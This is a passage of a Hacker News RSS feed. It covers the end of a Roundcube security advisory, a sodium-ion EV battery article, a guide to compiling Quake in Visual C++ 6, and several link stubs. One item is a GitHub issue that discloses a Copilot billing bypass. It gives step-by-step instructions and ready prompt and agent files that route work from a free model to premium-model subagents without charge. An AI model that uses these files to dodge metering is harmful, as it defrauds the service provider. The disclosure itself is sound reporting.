</span></span></span></code></pre></div><p>Now <code>&lt;feImage href&gt;</code> hits <code>is_image_attribute()</code> first, gets routed through <code>wash_uri()</code>, and the remote URL is blocked.</p><p>Update to 1.5.13 or 1.6.13.</p><h2 id="timeline">Timeline<a href="#timeline" aria-label="Link to this section"></a></h2><table><thead><tr><th>Date</th><th>Event</th></tr></thead><tbody><tr><td>2026-01-04</td><td>Reported to Roundcube</td></tr><tr><td>2026-02-08</td><td>1.5.13 and 1.6.13 released</td></tr><tr><td>2026-02-08</td><td>This post</td></tr></tbody></table></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Bun v1.3.9 (155 pts)]]></title>
            <link>https://bun.com/blog/bun-v1.3.9</link>
            <guid>46936595</guid>
            <pubDate>Sun, 08 Feb 2026 17:39:00 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://bun.com/blog/bun-v1.3.9">https://bun.com/blog/bun-v1.3.9</a>, See on <a href="https://news.ycombinator.com/item?id=46936595">Hacker News</a></p>
&lt;Not HTML&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[The first sodium-ion battery EV is a winter range monster (134 pts)]]></title>
            <link>https://insideevs.com/news/786509/catl-changan-worlds-first-sodium-ion-battery-ev/</link>
            <guid>46936315</guid>
            <pubDate>Sun, 08 Feb 2026 17:15:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://insideevs.com/news/786509/catl-changan-worlds-first-sodium-ion-battery-ev/">https://insideevs.com/news/786509/catl-changan-worlds-first-sodium-ion-battery-ev/</a>, See on <a href="https://news.ycombinator.com/item?id=46936315">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                                                    
                        <ul>
<li>The Changan Nevo A06 is the world's first mass-produced car powered by a sodium-ion battery.</li>
<li>It has a CLTC range of about 250 miles and can run with little to no range loss even in -40 degrees Fahrenheit.</li>
<li>It's the start of a new "dual chemistry era," CATL said.&nbsp;&nbsp;</li>
</ul>
<p>​Chinese battery giant CATL and automaker Changan Automobile are preparing to put the world’s first passenger car powered by sodium-ion batteries on public roads by mid-2026. And if the launch is successful, it could usher in an era where electric vehicles present less of a fire risk and can better handle extreme temperatures.&nbsp;<br>​<br>The <a href="https://insideevs.com/news/757347/catl-sodium-ion-ev-battery-loves-cold/" data-inline-widget="internal-links" data-type-id="0" data-params="%7B%22article_edition_id%22%3A%22757347%22%2C%22section%22%3A%221%22%2C%22alias%22%3A%22catl-sodium-ion-ev-battery-loves-cold%22%7D">CATL Naxtra sodium-ion battery</a> will debut in the Changan Nevo A06 sedan, delivering an estimated range of around 400 kilometers (249 miles) on the China Light-Duty Test Cycle. From there, the battery will roll out across Changan’s broader portfolio, including EVs from Avatr, Deepal, Qiyuan and Uni, the company said.</p>
<p>​“The launch represents a major step in the industry’s transition toward a dual-chemistry ecosystem, where sodium-ion and lithium-ion batteries complement each other to meet diverse customer needs,” CATL said in a press release.</p>
<section data-is-mosaic="0" contenteditable="false" draggable="true" data-widget="image" data-border="" data-id="7963534">
        <span>
            <svg>
                <use xlink:href="https://insideevs.com/design/dist/critical/icons/sprite-common-0-d0b1a78dabe597256d5fd42bb2b5bb69.svg#semidir"></use>
            </svg>
        </span>
    <picture>
        <source type="image/webp" srcset="
            https://cdn.motor1.com/images/mgl/y24Y6G/s5/catl-sodium-ion-battery.webp 213w,
            https://cdn.motor1.com/images/mgl/y24Y6G/s6/catl-sodium-ion-battery.webp 445w,
            https://cdn.motor1.com/images/mgl/y24Y6G/s4/catl-sodium-ion-battery.webp 889w,
            https://cdn.motor1.com/images/mgl/y24Y6G/s3/catl-sodium-ion-battery.webp 1280w,
            https://cdn.motor1.com/images/mgl/y24Y6G/s2/catl-sodium-ion-battery.webp 1440w,
            https://cdn.motor1.com/images/mgl/y24Y6G/s1/catl-sodium-ion-battery.webp 1920w
        " sizes="(max-width: 767px) calc(100vw - 24px), (max-width: 1023px) calc(100vw - 48px), 644px">
        <source type="image/jpeg" srcset="
            https://cdn.motor1.com/images/mgl/y24Y6G/s5/catl-sodium-ion-battery.jpg 213w,
            https://cdn.motor1.com/images/mgl/y24Y6G/s6/catl-sodium-ion-battery.jpg 445w,
            https://cdn.motor1.com/images/mgl/y24Y6G/s4/catl-sodium-ion-battery.jpg 889w,
            https://cdn.motor1.com/images/mgl/y24Y6G/s3/catl-sodium-ion-battery.jpg 1280w,
            https://cdn.motor1.com/images/mgl/y24Y6G/s2/catl-sodium-ion-battery.jpg 1440w,
            https://cdn.motor1.com/images/mgl/y24Y6G/s1/catl-sodium-ion-battery.jpg 1920w
        " sizes="(max-width: 767px) calc(100vw - 24px), (max-width: 1023px) calc(100vw - 48px), 644px">
        <img src="https://cdn.motor1.com/images/static/16x9-tr.png" alt="CATL Sodium Ion Battery" width="16" height="9" loading="lazy">
    </picture>
    <p>CATL Sodium Ion Battery</p>
    <p>Photo by: CATL</p>
</section>
<p>It’s a meaningful step forward for the technology that’s rapidly emerging as an alternative to lithium-iron phosphate (LFP) batteries, which currently dominate China’s EV market. <a href="https://insideevs.com/news/699010/are-sodium-ion-batteries-dead-on-arrival/" data-inline-widget="internal-links" data-type-id="0" data-params="%7B%22article_edition_id%22%3A%22699010%22%2C%22section%22%3A%221%22%2C%22alias%22%3A%22are-sodium-ion-batteries-dead-on-arrival%22%7D">Studies</a> show that sodium-ion batteries carry no risk of thermal runaway and are far less sensitive to extreme temperatures. Above all, sodium is significantly cheaper and far more abundant than lithium.</p>
<p>​From an energy density standpoint, the Naxtra battery is competitive but not revolutionary. It delivers 175 watt-hours per kilogram of energy density, which is lower than nickel-rich chemistries but roughly on par with LFP. That makes it more suitable for low-cost and low-range EVs as well as stationary energy storage.<br>​<br>By using a cell-to-pack design, where individual cells are integrated directly into the battery pack instead of modules, CATL was able to extract 400 kilometers (249 miles) of range on the CTLC cycle.</p>
<section contenteditable="false" draggable="true" data-widget="special_image" data-align="center" data-source="{&quot;source_id&quot;:&quot;1631&quot;,&quot;title&quot;:&quot;Changan&quot;}"><span>
    <svg>
        <use xlink:href="https://insideevs.com/design/dist/critical/icons/sprite-common-0-d0b1a78dabe597256d5fd42bb2b5bb69.svg#semidir"></use>
    </svg>
</span> <p><a href="https://cdn.motor1.com/images/custom/worlds-first-mass-produced-sodium-ion-passenger-vehicle-.png"> <img draggable="false" src="https://cdn.motor1.com/images/custom/worlds-first-mass-produced-sodium-ion-passenger-vehicle-.png" alt="worlds-first-mass-produced-sodium-ion-passenger-vehicle-" width="1762" height="654" loading="lazy"> </a></p> <p>Photo by: Changan</p> </section>
<p>But CATL says there’s plenty of room for improvement on the range front. As the sodium-ion supply chain matures, the company expects EV range to climb to 600 kilometers (373 miles), while extended-range EVs (EREVs) and hybrids could reach up to 400 kilometers (249 miles). That would cover more than half of the typical range requirements in China’s EV market, CATL claims.<br>​<br>Where the Naxtra battery really stands out, however, is cold-weather performance. CATL says its discharge power at -30 degrees Celsius (-22 degrees Fahrenheit) is three times higher than that of LFP batteries.</p>
<p>Unlike LFP or nickel-manganese-cobalt (NMC) packs, it reportedly avoids severe winter range loss, retaining more than 90% of its range at -40 degrees C (-40 degrees F). Power delivery is also said to remain stable at temperatures as low as -50 degrees C (-58 degrees F).</p>
    <section contenteditable="false" draggable="true" data-widget="widget-newsletter">
        <p><img src="https://cdn.motor1.com/custom/share/evus_newsletter_widget_logo.svg" alt="logo">
        </p>
        
    </section>

<p>As always, we’ll have to wait for independent testing for real-world results. But on paper, the technology looks genuinely compelling. While the Naxtra battery isn’t coming to the U.S., it could be especially valuable in places like the Midwest and the Northeast, where EV drivers routinely report <a href="https://insideevs.com/news/786332/tesla-model-3-deep-freeze-night-charge-efficiency/" data-inline-widget="internal-links" data-type-id="0" data-params="%7B%22article_edition_id%22%3A%22786332%22%2C%22section%22%3A%221%22%2C%22alias%22%3A%22tesla-model-3-deep-freeze-night-charge-efficiency%22%7D">steep range losses when temperatures plunge in winter</a>.<br>​<br>While lithium-ion batteries aren’t going anywhere, it’s becoming increasingly clear that the future of EVs will be defined by multiple battery chemistries coexisting. That’s how internal combustion engines evolved over the years, giving drivers more options to be able to choose the battery technology that best fits their driving habits, power needs—and the climate they live in.</p>
<p><em>Contact the author: <a href="mailto:suvrat.kothari@insideevs.com" target="_blank" rel="noopener">suvrat.kothari@insideevs.com</a>.</em></p>
<section contenteditable="false" draggable="true" data-widget="related-content" data-widget-size="content" data-params="%7B%22type_id%22%3A0%2C%22title_id%22%3A%22%22%2C%22items%22%3A%5B%7B%22article_edition_id%22%3A%22779015%22%2C%22title%22%3A%22Sodium-Ion%20Batteries%20Have%20Landed%20In%20America.%20Now%20Comes%20The%20Hard%20Part%22%2C%22alias%22%3A%22sodium-ion-batteries-grid-scale-energy-storage%22%2C%22section%22%3A%221%22%2C%22is_video%22%3A%220%22%2C%22images%22%3A%7B%22s5%22%3A%22https%3A%2F%2Fcdn.motor1.com%2Fimages%2Fmgl%2FlEl1el%2Fs5%2Fpeak-energy-storage.jpg%22%7D%7D%2C%7B%22article_edition_id%22%3A%22763719%22%2C%22title%22%3A%22General%20Motors%20Is%20Exploring%20Solid-State%20Batteries%20As%20EV%20Push%20Expands%22%2C%22alias%22%3A%22gm-ev-battery-assault-just-getting-started%22%2C%22section%22%3A%221%22%2C%22is_video%22%3A%220%22%2C%22images%22%3A%7B%22s5%22%3A%22https%3A%2F%2Fcdn.motor1.com%2Fimages%2Fmgl%2FJOxW84%2Fs5%2Fgm-ultium-skateboard-platform.jpg%22%7D%7D%2C%7B%22article_edition_id%22%3A%22757347%22%2C%22title%22%3A%22CATL%E2%80%99s%20Sodium-Ion%20EV%20Battery%20Loves%20The%20Cold%C2%A0%22%2C%22alias%22%3A%22catl-sodium-ion-ev-battery-loves-cold%22%2C%22section%22%3A%221%22%2C%22is_video%22%3A%220%22%2C%22images%22%3A%7B%22s5%22%3A%22https%3A%2F%2Fcdn.motor1.com%2Fimages%2Fmgl%2FrKq2Zr%2Fs5%2Fcatl-sodium-ion-ev-battery.jpg%22%7D%7D%2C%7B%22article_edition_id%22%3A%22741405%22%2C%22title%22%3A%22CATL's%20New%20Sodium-Ion%20EV%20Battery%20Works%20In%20-40%20Degree%20Cold%22%2C%22alias%22%3A%22catl-sodium-ion-battery-temp%22%2C%22section%22%3A%221%22%2C%22is_video%22%3A%220%22%2C%22images%22%3A%7B%22s5%22%3A%22https%3A%2F%2Fcdn.motor1.com%2Fimages%2Fmgl%2FQevBxZ%2Fs5%2Fcatl-cold-battery.jpg%22%7D%7D%5D%7D"> <p>Related Stories</p>  </section>                                                                        <!-- new gallery place, attached gallery -->
                        
                                                                            
                                                
                                                    <section>
	<p>
		<svg width="24" height="25" viewBox="0 0 24 25" fill="none" xmlns="http://www.w3.org/2000/svg">
			<path d="M18 8.46875C18.7956 8.46875 19.5587 8.78482 20.1213 9.34743C20.6839 9.91004 21 10.6731 21 11.4688C21 12.2644 20.6839 13.0275 20.1213 13.5901C19.5587 14.1527 18.7956 14.4687 18 14.4688M10 8.46875V19.4688C10 19.734 9.89464 19.9883 9.70711 20.1759C9.51957 20.3634 9.26522 20.4688 9 20.4688H8C7.73478 20.4688 7.48043 20.3634 7.29289 20.1759C7.10536 19.9883 7 19.734 7 19.4688V14.4688M12 8.46876L16.524 4.69876C16.6555 4.58927 16.8154 4.51951 16.9851 4.49766C17.1548 4.47582 17.3271 4.50279 17.482 4.57541C17.6369 4.64803 17.7679 4.7633 17.8597 4.90771C17.9514 5.05212 18.0001 5.21968 18 5.39076V17.5468C18.0001 17.7178 17.9514 17.8854 17.8597 18.0298C17.7679 18.1742 17.6369 18.2895 17.482 18.3621C17.3271 18.4347 17.1548 18.4617 16.9851 18.4399C16.8154 18.418 16.6555 18.3483 16.524 18.2388L12 14.4688H4C3.73478 14.4688 3.48043 14.3634 3.29289 14.1759C3.10536 13.9883 3 13.734 3 13.4688V9.46876C3 9.20354 3.10536 8.94919 3.29289 8.76165C3.48043 8.57412 3.73478 8.46876 4 8.46876H12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
		</svg>
		<span>We want your opinion!</span>
	</p>
	<div>
		<p>What would you like to see on Insideevs.com?</p>
		<p><a href="https://insideevs.com/survey/2025/">
			Take our 3 minute survey.		</a>
	</p></div>
	<p>- The InsideEVs team</p>
</section>                                                

                                                    

                                                            
                                                        
                            
                            
                                                            
                            
                                                            
                                
                            
                                
                                                                        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Let's compile Quake like it's 1997 (145 pts)]]></title>
            <link>https://fabiensanglard.net/compile_like_1997/index.html</link>
            <guid>46936274</guid>
            <pubDate>Sun, 08 Feb 2026 17:11:42 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://fabiensanglard.net/compile_like_1997/index.html">https://fabiensanglard.net/compile_like_1997/index.html</a>, See on <a href="https://news.ycombinator.com/item?id=46936274">Hacker News</a></p>
<div id="readability-page-1" class="page"><br><center>
    

</center><p>
Feb 5, 2026</p>
<p>Let's compile Quake like it's 1997!</p><hr>
 

<p>The first batches of <i>Quake</i> executables, <code>quake.exe</code> and <code>vquake.exe</code> were programmed on HP 712-60 running NeXT and cross-compiled with DJGPP running on a DEC Alpha server 2100A. In June of 1996, having shipped their title but concerned with NeXT stagnation, id Software switched their development stack.</p>

<blockquote>
We moved to Intergraph hardware running Windows NT right after shipping Quake.<p>- John Carmack<a name="back_1" href="#footnote_1"><sup>[1]</sup></a></p>
    </blockquote>


<p>The next versions of <i>Quake</i>, <code>winquake.exe</code>, <code>glquake.exe</code>, and <i>QuakeWorld</i> (<code>qwcl.exe</code> and <code>qwsv.exe</code>) were all developed and compiled on Windows NT with Visual C++ 4.X.</p>

<p>This article describes the steps to re-create the experience of building the win32 binaries of Quake as it happened in 1997.</p>

<p>The purist's corner</p><hr><p>Depending on the level of historical accuracy you want to reach, you can follow the steps with four environments.</p>

<ul>
  <li>Find an Intergraph RealizM Dual P6-200MHz workstation (good luck).</li>
  <li>Find a dual Pentium Pro machine (good luck again but finding a W6-LI is doable).</li>
  <li>Use a regular late 90's PC like the <a href="https://fabiensanglard.net/quake_pc">Quake PC</a>.</li>
  <li>Download Oracle's Virtualbox and create a VM.</li>
</ul>

<p>I tested these steps both on the Quake PC and in Virtualbox, running either Windows 98SE or Windows NT 4.0.</p>

<p>Installing Windows NT 4</p><hr><p>Installing Windows NT 4 is pretty easy since the CD is bootable. Installation took 30 minutes.</p>





<a href="https://fabiensanglard.net/compile_like_1997/windows_NT_4_startup.webp"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/windows_NT_4_startup.webp" width="1600" height="1200"></a>
<p>I love how minimalist Windows NT startup screen is. It proudly displayed how many CPUs are detected (Windows 95/98 only supports one CPU) and how much RAM is there. There is no silly animation.</p>

<p>Adding a second CPU to a system won't be automatically detected by Windows NT. You need to re-install to get the HAL handling SMP systems. The same thing goes with dual CPU motherboard. On a W6-LI, one need not only to add another Pentium Pro but also a regulator!</p>

<a href="https://fabiensanglard.net/compile_like_1997/windows_NT_4.webp"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/windows_NT_4.webp" width="1024" height="768"></a>
<p>Windows NT 4 uses the same UI theme as Windows 9X. The first release, Windows NT 3 used the same UI elements as Windows 3.1. It <a href="https://fabiensanglard.net/compile_like_1997/windowsnt3.1.png">looked</a> <a href="https://fabiensanglard.net/compile_like_1997/Winnt31.webp">awful</a>.</p>




<p>Installing Visual C++ 6</p><hr><p>The Win32 version of Quake were coded on Visual C++ 4.X since it was the most recent version of Microsoft IDE available in mid-96. However, by 1999, the project had been migrated to Visual C++ 6. If you don't have the CD handily available, you can likely find it on the Internet Archive or winworldpc.com.</p>


<a href="https://fabiensanglard.net/compile_like_1997/1.png"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/1.png" width="1280" height="1024"></a>
<p>In a time before "always on" Internet, most software had a product ID to fight piracy.</p>
<a href="https://fabiensanglard.net/compile_like_1997/2.png"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/2.png" width="1280" height="1024"></a>
<p>The installation screen also brings up the next "Visual Studio", combining many development environments. It would soon become THE Microsoft IDE to rule them all.</p>
<a href="https://fabiensanglard.net/compile_like_1997/3.png"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/3.png" width="1280" height="1024"></a>
<p>The installation screen looks off. There is a lot of empty space and the progress bar is awkwardly placed. That is because Microsoft did not expect this to run at the crazy high resolution of 1280x1024 (which id developers likely used on their 21" monitors). It only looks as intended in 640x480 or 800x600.</p>
<a href="https://fabiensanglard.net/compile_like_1997/4.png"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/4.png" width="1280" height="1024"></a>

<a href="https://fabiensanglard.net/compile_like_1997/5.png"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/5.png" width="1280" height="1024"></a>
<p>With VC++6 installed, we now need to get the source code. DO NOT get it from github or transfer the files via FTP. This will mess up the workspace <code>.dsw</code> file. Then VC++6 will be unable to parse it. And it won't even give you an error message, it will just open and show no file / project associated. And you will lose 1/2 a day trying to debug the problem.</p>

<p>Instead, you need to get <a href="https://fabiensanglard.net/compile_like_1997/q1source.zip">q1source.zip</a>. It used to be available on id Software's FTP server but now you can get it from the awesome <i>Quake Official Archive</i> maintained by Jason Brownless<a name="back_2" href="#footnote_2"><sup>[2]</sup></a>.</p>


<a href="https://fabiensanglard.net/compile_like_1997/6.png"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/6.png" width="1280" height="1024"></a>
<p>With a VM you can transfer files via drag/drop. Alternatively you can use <i>Quick ‘n Easy FTP Server</i> which works on both 9X/NT.</p>

<a href="https://fabiensanglard.net/compile_like_1997/7.png"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/7.png" width="1280" height="1024"></a><p>To decompress <code>q1source.zip</code>, you will need WinRar. The v2.50 still works well on 9X/NT.</p>


<a href="https://fabiensanglard.net/compile_like_1997/8.png"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/8.png" width="1280" height="1024"></a>
<p>Now launch VC++6. Select "Open Workspace" then pick "WinQuake.dsw".</p>

<p>Modern versions of Visual Studio use .sln (Solution) and .vcxproj but Visual C++ 6 uses .dsp and .dsw. The dsp contains a single project while the dsw is a workspace pointing to dsp projects.</p>

<a href="https://fabiensanglard.net/compile_like_1997/9.png"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/9.png" width="1280" height="1024"></a>
<p>Start the build with "Rebuild All"</p>
<a href="https://fabiensanglard.net/compile_like_1997/10.png"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/10.png" width="1280" height="1024"></a>
<p>The build will fail because VC6++ was unable to assemble all the <code>.s</code> files which contain the hand-optimized assembly by Michael Abrash.</p>
<a href="https://fabiensanglard.net/compile_like_1997/11.png"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/11.png" width="1280" height="1024"></a>

<p>The assembler comes with VC++6 Processor Pack (vcpp5.exe).</p>
<a href="https://fabiensanglard.net/compile_like_1997/12.png"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/12.png" width="1280" height="1024"></a>
<p>Of course, launching setupsp5.exe to install it will fail. This is because you need to install MDAC 2.5 first.</p> 
  <a href="https://fabiensanglard.net/compile_like_1997/13.png"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/13.png" width="1280" height="1024"></a>

<p> Don't lose an hour trying to download MDAC from somewhere. You just need to run acmsetup.exe which is in the same folder created when vs6spp5.exe decompressed itself.</p>

<a href="https://fabiensanglard.net/compile_like_1997/14.png"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/14.png" width="1280" height="1024"></a>
<p>Now go back and run setupsp5.exe. This time it will work. By now it should feel like you are following the solution of Monkey Island. Nothing makes sense. We are definitely deeeep into the 90s.</p>
<a href="https://fabiensanglard.net/compile_like_1997/15.png"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/15.png" width="1280" height="1024"></a>
<p>More awkwardly small progress bar but this is still progress.</p>
<a href="https://fabiensanglard.net/compile_like_1997/16.png"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/16.png" width="1280" height="1024"></a>
<p>Re-open the project with VC++6 and run "Rebuild All " again. This time it should work.</p>
<a href="https://fabiensanglard.net/compile_like_1997/17.png"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/17.png" width="1280" height="1024"></a>
<p>Yup! Enjoy! You can even build/run <a href="https://fabiensanglard.net/quakeworld">QuakeWorld</a> and it works with QSpy!</p>
<a href="https://fabiensanglard.net/compile_like_1997/19.png"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/19.png" width="1280" height="1024"></a>
<p>A darn good IDE</p><hr><p>VC++6 is remarkably powerful for 1996. It has features such as "Go to definition", breakpoints, stacktrace, and variable inspections (but no Intellisense auto-completion yet). I never used it but it must have felt like a dream at the time.</p>
<a href="https://fabiensanglard.net/compile_like_1997/20.png"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/20.png" width="1280" height="1024"></a><a href="https://fabiensanglard.net/compile_like_1997/21.png"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/21.png" width="1280" height="1024"></a>

<a href="https://fabiensanglard.net/compile_like_1997/vcc2.webp"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/vcc2.webp" width="1280" height="1024"></a><a href="https://fabiensanglard.net/compile_like_1997/vcc3.webp"><img loading="lazy" src="https://fabiensanglard.net/compile_like_1997/vcc3.webp" width="1152" height="864"></a>



<p>References</p><hr> <hr>
 <center>*</center></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: I created a Mars colony RPG based on Kim Stanley Robinson's Mars books (157 pts)]]></title>
            <link>https://underhillgame.com/</link>
            <guid>46936237</guid>
            <pubDate>Sun, 08 Feb 2026 17:08:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://underhillgame.com/">https://underhillgame.com/</a>, See on <a href="https://news.ycombinator.com/item?id=46936237">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Billing can be bypassed using a combo of subagents with an agent definition (191 pts)]]></title>
            <link>https://github.com/microsoft/vscode/issues/292452</link>
            <guid>46936105</guid>
            <pubDate>Sun, 08 Feb 2026 16:56:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/microsoft/vscode/issues/292452">https://github.com/microsoft/vscode/issues/292452</a>, See on <a href="https://news.ycombinator.com/item?id=46936105">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-testid="issue-body-viewer" data-team-hovercards-enabled="true" data-turbolinks="false" id="issue-body-viewer"><h2 dir="auto">Summary</h2>
<p dir="auto">It's possible in Copilot to bypass any billing / 'premium request' usage by taking advantage of:</p>
<ul dir="auto">
<li>Subagents and tool calls not consuming any 'requests'.</li>
<li>Request cost being calculated on the initial model used.</li>
<li>"Free" models incl. in Copilot e.g. GPT-5-mini, GPT-4.1 etc.</li>
<li>Ability to define an agent for a subagent.</li>
<li>Ability to specify a model for an agent.</li>
</ul>
<p dir="auto">Combining these correctly results in 'free' and almost unlimited, usage of expensive premium models like Opus 4.5 which would usually cost '3 premium requests':</p>
<h2 dir="auto">Instructions</h2>
<ol dir="auto">
<li>Start a new Chat.</li>
<li>Set the model to a "free" model, included in Copilot e.g. GPT-5 Mini.</li>
<li>Create an agent, and set it's model to a premium model, e.g. Opus 4.5</li>
<li>Set the mode to "agent".</li>
<li>In the initial message, instruct it to launch an agent '[your_agents_name_here]' as a subagent using the runSubagent tool, and to pass on the following query e.g. "What time is it in London, UK".</li>
<li>Submit the message.</li>
<li>The initial request will be picked up by the free GPT-5 Mini model, incurring no fees.</li>
<li>The free model will create a subagent (which is also free)</li>
<li>The free subagent will launch with an 'agent' profile, this profile has the model set to a premium model</li>
<li>The premium model will be used for the subagent - but premium requests will be consumed.</li>
</ol>
<h2 dir="auto">Example 1</h2>
<p dir="auto"><strong>Example Chat Message:</strong></p>
<div dir="auto" data-snippet-clipboard-copy-content="/ask-opus Make a todolist app."><pre>/ask-opus Make a todolist app.</pre></div>
<hr>
<p dir="auto"><strong>Example Prompt File:</strong><br>
<code>.github/prompts/ask-opus.prompt.md</code></p>
<div dir="auto" data-snippet-clipboard-copy-content="---
name: ask-opus
description: Run a query in a subagent that uses the Opus-4.5 model.
model: GPT-5 mini (copilot)
agent: agent
---
<USER_REQUEST_INSTRUCTIONS>
Call #tool:agent/runSubagent - include the following args:
- agentName: &quot;opus-agent&quot;
- prompt: $USER_QUERY
</USER_REQUEST_INSTRUCTIONS>

<USER_REQUEST_RULES>
- You can call the 'subagent' defined in 'USER_REQUEST_INSTRUCTIONS' as many times as needed to fulfill the user's request.
- It's recommended you use the subagent to help you decide how best to respond and/or complete the task (because it is a larger model than you) including how best to break the task down into smaller steps if needed.
- Use the subagent for all todos/tasks/queries, do not perform any task or respond to any query yourself, you are just an orchestrator.
- Do not manipulate/summarize subagent responses to save on tokens, always be comprehensive and verbose.
- Do not evaluate or respond to the remainder of this message, the subagent is responsible for all further content.
</USER_REQUEST_RULES>

--- USER_REQUEST_START ---"><pre><span>---</span>
<span>name</span>: <span>ask-opus</span>
<span>description</span>: <span>Run a query in a subagent that uses the Opus-4.5 model.</span>
<span>model</span>: <span>GPT-5 mini (copilot)</span>
<span>agent</span>: <span>agent</span>
<span>---</span>
&lt;USER_REQUEST_INSTRUCTIONS&gt;
Call #tool<span>:</span><span>agent</span>/runSubagent - include the following args:
<span>-</span> agentName: "opus-agent"
<span>-</span> prompt: $USER_QUERY
&lt;/USER_REQUEST_INSTRUCTIONS&gt;

&lt;USER_REQUEST_RULES&gt;
<span>-</span> You can call the 'subagent' defined in 'USER_REQUEST_INSTRUCTIONS' as many times as needed to fulfill the user's request.
<span>-</span> It's recommended you use the subagent to help you decide how best to respond and/or complete the task (because it is a larger model than you) including how best to break the task down into smaller steps if needed.
<span>-</span> Use the subagent for all todos/tasks/queries, do not perform any task or respond to any query yourself, you are just an orchestrator.
<span>-</span> Do not manipulate/summarize subagent responses to save on tokens, always be comprehensive and verbose.
<span>-</span> Do not evaluate or respond to the remainder of this message, the subagent is responsible for all further content.
&lt;/USER_REQUEST_RULES&gt;

--- USER_REQUEST_START ---</pre></div>
<hr>
<p dir="auto"><strong>Example Agent File</strong><br>
<code>.github/agents/opus.agent.md</code></p>
<div dir="auto" data-snippet-clipboard-copy-content="---
name: opus-agent
description: An AI agent that assists a user with a task or query.
argument-hint: Query or task to complete
model: Claude Opus 4.5 (copilot)
---
Respond to the user's query/task ($ARGUMENTS) in comprehensively and accurately."><pre><span>---</span>
<span>name</span>: <span>opus-agent</span>
<span>description</span>: <span>An AI agent that assists a user with a task or query.</span>
<span>argument-hint</span>: <span>Query or task to complete</span>
<span>model</span>: <span>Claude Opus 4.5 (copilot)</span>
<span>---</span>
Respond to the user's query/task ($ARGUMENTS) in comprehensively and accurately.</pre></div>
<hr>
<h2 dir="auto">Example 2</h2>
<p dir="auto">Another vector for abuse - albeit requiring more effort is:</p>
<ul dir="auto">
<li>Set <code>chat.agent.maxRequests</code> to a high value.</li>
<li>Use a premium model e.g. Opus 4.5 as the initial model for the chat session.</li>
<li>Build a custom script (not disclosed for safety), that you tell the model to call as part of a tool invocation.</li>
<li>Craft some prompts to direct the model to repeat the tool call(s).</li>
<li>The right script, with the right prompts can be tailored to create a loop, allowing the premium model to continually be invoked unlimited times for no additional cost beyond that of the initial message. </li>
</ul>
<p dir="auto">In my testing I had a single message result in a 3hr+ process that launched hundreds of Opus 4.5 subagents to process hundreds of files - and only consumed 3 premium credits. Had I not stopped it at 3hrs, it would have continued.</p>
<hr>
<p dir="auto"><strong>Related</strong>: I also noted the message 'types' are being declared on the client, inferring no API validation e.g: <a href="https://github.com/microsoft/vscode-copilot-chat/blob/main/src/extension/intents/node/toolCallingLoop.ts#L484">https://github.com/microsoft/vscode-copilot-chat/blob/main/src/extension/intents/node/toolCallingLoop.ts#L484</a></p>
<p dir="auto">I believe this is another vector that allows for more blatant abuse directly against the API.</p>
<hr>
<p dir="auto"><strong>Note</strong>: Initially submitted this to MSRC (VULN-172488), MSRC insisted bypassing billing is outside of MSRC scope and instructed me multiple times to file as a public bug report.</p>
<hr>
<ul dir="auto">
<li>Copilot Chat Extension Version: 0.37.2026013101</li>
<li>VS Code Version: 1.109.0-insider (Universal) - <a data-hovercard-type="commit" data-hovercard-url="https://github.com/microsoft/vscode/commit/f3d99dee2f4c63061a08f828e0ca6b6acf6ac0f8/hovercard" href="https://github.com/microsoft/vscode/commit/f3d99dee2f4c63061a08f828e0ca6b6acf6ac0f8"><tt>f3d99de</tt></a></li>
<li>OS Version: OSX Tahoe 26.3</li>
<li>Feature: Agent / SubAgent</li>
</ul>
<p dir="auto">This is NOT the same issue as <a data-error-text="Failed to load title" data-id="3169386998" data-permission-text="Title is private" data-url="https://github.com/microsoft/vscode/issues/252230" data-hovercard-type="issue" data-hovercard-url="/microsoft/vscode/issues/252230/hovercard" href="https://github.com/microsoft/vscode/issues/252230">#252230</a><br>
(My previous issue was auto closed by the bot and deferred to the above).</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Omega-3 is inversely related to risk of early-onset dementia (253 pts)]]></title>
            <link>https://pubmed.ncbi.nlm.nih.gov/41506004/</link>
            <guid>46935991</guid>
            <pubDate>Sun, 08 Feb 2026 16:47:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://pubmed.ncbi.nlm.nih.gov/41506004/">https://pubmed.ncbi.nlm.nih.gov/41506004/</a>, See on <a href="https://news.ycombinator.com/item?id=46935991">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="article-page" data-article-pmid="41506004">
    

    <main id="article-details">
  
  
